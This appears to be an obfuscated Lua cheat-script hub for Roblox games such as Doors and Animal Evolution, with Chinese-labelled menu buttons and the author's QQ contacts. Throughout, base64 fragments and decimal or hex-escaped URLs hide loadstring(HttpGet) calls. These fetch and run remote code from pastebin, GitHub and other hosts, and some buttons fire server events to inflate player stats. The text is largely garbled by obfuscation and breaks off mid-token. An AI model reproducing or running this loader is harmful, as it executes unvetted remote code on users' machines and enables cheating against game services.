c3RyaW5nKGdhbWU6SHR0cEdldCg=')\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\119\101\105\115\104\97\110\116\101\97\109\47\83\99\114\105\112\116\47\109\97\105\110\47\100\111\111\114\115\47\87\101\105\83\104\97\110\95\76\111\97\100\101\114\46\108\117\97\10tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MWrhPHKePLpSSbVNrJKhXtGXnVwbHTXYKYurmUzyrsbqRhdZEKIklCwEQbzQdhsrxWXCIeKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Doors（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VxOheSwtEkSEbxJmOeeZSixbJGTGdqzaRbCWMqKoqvCrcfboFHFPCfIKltVFmOtSsozfEYLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/Su9RsViT/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eCMPJycJrHaRFBbeSmZOrQXCcODoJFXqCVJXbsokSPMRivWtHCRpkLNLFWQnKrwCmuSQffKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Doors（最强1）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cLuAfWfvBFpmSVAXSlaUTPSudcwEylPEMYfBBzYWMrJNKYIiuZgsaqEqTbbzcprpDHSQkzLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://raw.githubusercontent.com/mstudio45/poopdoors_edited/main/poopdoors_edited.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YpEhSbRHwmNsyoueSNMvZRcZtgqGHgwdaTtFPVCPAIaIwKrSgzxVGlKlYoHrAEdNGayOhdKSx0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Doors（最强2）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MnwUUdKmsoBOwBkgduwEzTbtTZhSshObAeZeRRePQhgygNctRUHcAXXuDSFfiWgYJmwoRbLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\53\84\119\84\56\106\97tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uzexBEnaTPdbTNuriVscqWRpUSEkqCKlzkwVXCDgoWfTSJjmUvgVZOtxxtMPwjcuPhcbLHKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Doors（最强3）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WNnoAhpZvZdFPHODOUrqdVVAIVfVUijAtkGcyeBuAXfHYhgfbrrBGtecJVrLEMVBdNjDbJLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://pastebin.com/raw/R8QMbhzvtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('euvPnQQOLOCXAMPzvtSJGpkUOikmCkDCWnQIAbaTBALxakwkpmyJCXkzvrCkzTGOMruagVKSkpKCkNCmVuZCkNCiAgICBjcmVkaXRzOkJ1dHRvbig=')DOORS听说是好用脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PDBftYwtqRmeLqmdakrOfnxdMsGWyqFaIkzJTljCWazWWJmJWTVSihxIStCKktpbxPwVZOLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKA==')\112\114\105\110\116\40\34\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\75\73\78\71\72\85\66\48\49\47\66\108\97\99\107\75\105\110\103\47\109\97\105\110\47\66\108\97\99\107\75\105\110\103\37\50\48\68\111\111\114\115\37\50\48\77\111\98\105\108\101\34\41\41\40\41\32\34\41\10tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZKQlBzkmicemqIMPVdpspJUhZUNBLNpqZVjIFXBxgymbxcTCCqsnjOLOCtvcGIuzFGOzZwKSgpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')Doors（过room）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DPFQnMymkiBXxdWZxpriducmKwTwpgjouWqCjpNkjBLelgVfJKXfYMQAUrnUOwBbetsHzqLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x2E\x6C\x6B\x6D\x63\x2E\x61\x73\x69\x61\x2F\x73\x63\x72\x69\x70\x74\x2F\x64\x6F\x6F\x72\x73\x72\x6F\x6F\x6D\x2E\x6C\x75\x61tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hlbtCzkJtKhylBoCEZGRnWebMsosYTMpeAAXZFVWqYZInRRnVHUciDLWAzyabbssLrERkWKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sHRvfwhfXERfuhBWQfXniFAfptihmFKjAZEXvIXsPrnkHGnorujYNGQPCROQaZNZtZzlrVLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HQtvaWXPgaOKLgmVEbIpquHTsjbPSmrWbJaODQRRESbpaxKUJRNebDaPFoIhNLCIYGNdWWamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GqoSCTiuOUgmSGvhNWJvxjpoGHgzLpSVvBJxFKufSFlFpOHTwBNWABckOrndoVBeZhlPnzamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VJoNtXmrhIYJRLlqUKYuitpTQRCnlusGhJJrvsJhAaVBoCGGlTdZrGKGhsHhNOPKyWpxHQbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kSXhskcAYNDNrUKVbjPPFGHVZLYypDrMukuDdVxDxxYScqOAJqhxKhEVFEZVAZIrNeMZNTKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')破坏模拟器脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EWhgfkQnBhIRgLzIFotfJEVCSRXGKdJziWFXimygXWTlDgOpITlRkpnIIYUSavZzeEhogsLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IqnRsxpVpwNEQCxLNpbKMfOgoosGPofOFygBXGHBrlHUaZIjUUJhfLsJOIAsnZVKiZDTvkKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('caTmRuuTDDTaEEJKxfQlRPmgSreUGBPixLnsVClPDAFXuzcxMgdchCTaMaNrQoajPvqJjYLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')破坏模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NLhenCFAyxPDlFhtTUxtCPwMuadOieYkIQrwbhynoGSAqTrXnRmmzRPBfuETsgrKmiYKUuLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/AquaModz/DestructionSIMModded/main/DestructionSimAqua.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tNNRnBxhfXCcbXQcLGRyZlNmUMGEZcWqIgqcYxcEccggwrnylqAJkzjZTXzOZKFNJkpJpvKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')驾驶帝国tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pcNsgJkUwOdCUnbAuBZiMRlxbfCaOhQNFOylfrJXoAlCpGTtGgwCfuPcYabTdIETlMcXGbLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fbHUTMmRqHTozJOXizVaLzKRqIPjdJpbsKWeioGeNhttCSGGOzPZfhgfXgmZStFBzSVCDyKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')驾驶帝国脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QzzeFRCAdqLkCAUdLNAetvZhPkZkmiRKdHEKemNrleYYGaptFuiQoiicwpBuEytGEOcuotLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')驾驶帝国（英文）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EKmJWWPwLFMYloJGxWNLtaddBIiCfMwqurQoqTHosctQfkktIARKUntBwXnVFfYlDVyrKKLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://raw.githubusercontent.com/zeuise0002/SSSWWW222/main/README.mdtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tNKtznRtxKlMUHxwULPIqRKUVkCgksSmkzmisqqaNaPJFUARvhvNyoogZIeGXZkSqliiuVKSx0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')驾驶帝国（英文）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YbnsUbNbTuCFeucVwSiDcxhFEovEjBXzSNLAeiVDwaWtUeNjaFXWMCoJaNbkJYqklQkPwGLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://soggyhubv2.vercel.apptZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LcLvBPhHWGOvdnfXQbHPWesHBBKUgcmJAbwpUVwVlLbZImOQmWRXlGCcOfpGYKFqGSqiHEKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')动物进化脚本『有稳定』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XZfvLviXZLXNTYqJIbRTvcIMifdJFPgwhWwOGToNNAQQXvHqlkWkMqzKIlzRdkiPQNUUlHLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qNwaUwmCJFSvwupdUhqThghUvswAMJnRXQnWPkHSviylCExuJITrGiGGQBEcKaLHhYuUHSKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DkdfKzLOQHDeveMMbJfbnaodrmGlQbyzyUIYrFlmAtPHjgbrxiyUXHQOQSEGfUXGvfdmPVLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')动物进化1『容易封』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jDjNyFgsPnQDUarvTrqVBVUdzjwQhlEortDunibAChDGPeaJoBVUBYHBSpYPZgRPRXffWeLGZ1bmN0aW9uKCkNCiAgICBnYW1lOkdldFNlcnZpY2Uo')ReplicatedStoragetZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uuNaadpyZkkuaSzTtYMxuekSgMOcICfLHoaILggWqtOGNtgHmAtydpRpClclfnmGxLvzsGKS5FdmVudHMuVXBkYXRlU3RhdEV2ZW50OkZpcmVTZXJ2ZXIo')LvtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rfsKDsgRCxBKeqtCjWbSZPOjGrTUnwbWyasWbkGYmNOTNiHgSMJoNJjCDnJgVqffTJTFUuLCA5OTk5OTk5OTkpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')动物进化2『容易封』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WYYgUxMtCXwrQlBHSYHkafjtDvChWXhPkiTJXFURUJuryoZDhRAazHKGQfDALLCSCPiDBmLGZ1bmN0aW9uKCkNCiAgICBnYW1lOkdldFNlcnZpY2Uo')ReplicatedStoragetZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VufqmFNinSoDxrfBOdkALtklXCzgvmNeoJLLBLwxBWdTAndaZDngxYQEaOntgRUKxkpZszKS5FdmVudHMuVXBkYXRlU3RhdEV2ZW50OkZpcmVTZXJ2ZXIo')XptZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NXiEvDnafdzAJGzOUAZZIRXVUlJaJsHicGAfwqgggccHEhQNIjkRwkNpQezIXoSAJGUhRXLCA5OTk5OTk5OTkpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')动物进化3『容易封』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xGayxopqSvwnaNnFTpmExrmtbTtOHwIjAgMvIFybJXkIUgeHMtzsMTKpALbGIEPdeqmwzqLGZ1bmN0aW9uKCkNCiAgICBnYW1lOkdldFNlcnZpY2Uo')ReplicatedStoragetZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nqFHgcaogbXFxLOHztaPyzwdritvOirzosssIcDPffLMYyEpGtbacNWzfeQGhbyKUYbbQgKS5FdmVudHMuVXBkYXRlU3RhdEV2ZW50OkZpcmVTZXJ2ZXIo')DmgLvltZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jbxFjmNdXlNHCIMVOMQKyefyWtuMajxBDtzsATBrDGgESnpLnFOOlDmLpprItelcDLnPWLLCA5OTk5OTk5OTkpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')动物进化4『容易封』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wwpgVxYWlIvxbjVfVZAGDbSyKNuVNBRFayJUkfVclRxukmRxCPYcUHpNtGIoloXynQGTpPLGZ1bmN0aW9uKCkNCiAgICBnYW1lOkdldFNlcnZpY2Uo')ReplicatedStoragetZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MdcprOkMIHAuiAeneZnubUVyeHevYqcELrtUUVbBHDOqhrJJSvXEdgcWHQvrcgQoVjKOVFKS5FdmVudHMuVXBkYXRlU3RhdEV2ZW50OkZpcmVTZXJ2ZXIo')CritDmgLvltZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lUGkrKmobFcpUBAQJRXBHMIyqPmdDQSzhtooYsoqzpAGImKZCXjVbJzenNEByuCsNpeJsTLCA5OTk5OTk5OTkpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')动物进化『容易封』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vhbsbbdpBhNkysHbDtzutZvIYBonSpJoAtGqzozeYFaIvKKlpWJgVCetJaGGaLeCrOZUswLGZ1bmN0aW9uKCkNCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXINCg0KZm9yIF8sIGNoaWxkIGluIGlwYWlycyhwbGF5ZXI6R2V0Q2hpbGRyZW4oKSkgZG8NCiAgICBpZiBjaGlsZDpJc0Eo')BoolValuetZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UkkxCLyQJaQtuiNeGmLhXNidvJMPvIwICakfZtoUENfEJPgfFGlzlUqnnUcqzLrFLAmHFhKSB0aGVuDQogICAgICAgIGNoaWxkLlZhbHVlID0gdHJ1ZQ0KICAgIGVuZA0KZW5kDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')动物进化『稳』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QNmZTEcOGHBivfocsucheEwYhRaDhuNOVLNRBtgpJEDSUTKLTFaFdXVbfBQSjHdCVKdtCALGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Turtle-Secure/Animal-Evolution-Simulator/main/.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OzbUITjrlWcUTiRThyePLOiDKrFEOPhLnRarSjGJdGycvSUGEOBtnKUAnDzuzcMayISMinKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')浴缸战争脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NENPeRFFuMkjQagDANXBLZoAdvGbbyZPLBBxTVrWVMOIOiPOEYKclloLYJWbTIgsMRGlQALA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nuyzxfEDTVAABOYccYTeyhyldpKtnofOrVgqoDXnoPIgwtCSoFAbvvmRkAETDIXbqSikVXKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uubbCrKWbvNorwQGflOHqmbNcOBrRzsmDuZaOhmVvqHQjmJJtFagBHPIxakIETUgsUjUTkLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')（升级演习）浴缸战争tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZzBClaiNQfbFkdJQGMRNZqtLjRziUnnUkaMhXLTEnisXZQAWZboidXWHomMMjzxuLdGRANLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Alan0947383/Boom/main/Protected_1198219713372149.lua.txttZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WQrrnOtpyxMYoQjQpAETLXYkPNKetfLdMhPXBgINCvZyewVkvMIhdrzkzsOISShnLxlfGWLHRydWUpKSgpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')点我复制解密钥链接tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cBhGWzKZDUfASLEhMWPoKgLWjezKduOaZUKEbWNUbGEOLHnAzrkGIEuGiWGWtnkObGQQtILGZ1bmN0aW9uKCkNCiAgICBzZXRjbGlwYm9hcmQo')https://pandadevelopment.net/startkey.html?service=demonichubv2tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DQwhFBaZBZtvXRbDASXCIWyIOcvsuFQbQzUTJYjsyVLUAQwKMAliZmQJGuDnjBPrstFemhKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')飞行比赛脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OhnuVqEEEZTagzPaOuQWmzDqoEalQusJzgNkGOZPTTRBtDsXddWxDijSmnsBsoiwCcVyCnLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qdIlVTEYvYUBYbLeQzIrSepXrvlkrLnxpVpzizOnRuaoHuYeAAgTURpGUXCfZairgKVxfrKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EZvjFgDMKKubdMZnIIbzJBCIFMDGrBRjNyhAHrvCUiVNOzyqtUrwOitsHYgmEbuOgIJXbDLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')飞行比赛tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zsLPRFneDEjQRuPPKLEUBSYmOsEXEqvYfnAegQDrrRzPSRmJpBrFAOHqeHnxylLtKGhLVsLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/NightCoded/script/main/fly-race.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vRDYRILtKWyMsuLBlvvPFdzszbWCzQiYKKQzVJnMaJeBLAvLqWqMCQOTDuRyTbUKpUBEtEKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')俄亥俄州tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hLyxnWxAAMphvDoPXwxOdSCiUWpbybaYUEuBPfgMzfcUttEqRzcSDCiPfWmlItyGxXclxoLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vUvFtcevpDBtUOUbLgYJevVOqyAisJphtDiWsUmGMirDvDhsrPNggzMCzecFdBmIecLApDKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VCCksoBJHFoKeKSIkCjoudxxXOlfKSrASbpUbRCIVPOgPtSyuCvBGOvrlAsaEsvBTQGWytLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')俄亥俄州（老外1）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BjiYuoINkpQyjgPtanQsfHQTSngrNdyfiUPDHxdJHstcEjcZvaSHdGNzmnqkBAAMvYHSwmLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastebin.com/raw/0MqfXpvYtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qZKXdityukEQRLKtQvhxbjDtphKvBqwAbfwZcEFEBlSozPQgLpwiRVEfledCeuxkTvKpDELCB0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')俄亥俄州（老外2）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qvsUGIjPjhIcwpdjKoVDzqZrwPEXKPtEEQGXRFGuftqgWYnwUQiCfzhwqWtorJBQTelcWkLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastebin.com/raw/MyfCUnGKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SPoMPrAnJrEuBfhpBbuWAVlneRbEhxEksHcaHeorNAHfUitZkNjSzpdHRrleRCpiXeHWuhKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')俄亥俄州（自动工作＋传送工作地点）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UWphRxCJaWJbZYBDUvYJPrLDqTddYJbSjWSZxURPbvAIycxuDYTiSxTeQUlITmhwhZjeYwLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/LOLking123456/ohio/main/Roblox232tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WqSmYaFQmJHZagxQAMQiUFAcXIAHdhJUvpiPlouQcvQnDmPgQrdLzKQpTNbMqowtozOogwKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')俄亥俄州1tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rHqTwGHNfbJjZuJcvvsrgdornNpjvkCswyYknCXaBnujowAUNLsLHnnKneSwMcCamTxZEmLGZ1bmN0aW9